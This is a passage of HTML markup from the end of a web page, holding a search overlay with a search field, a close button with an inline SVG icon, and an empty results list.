128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>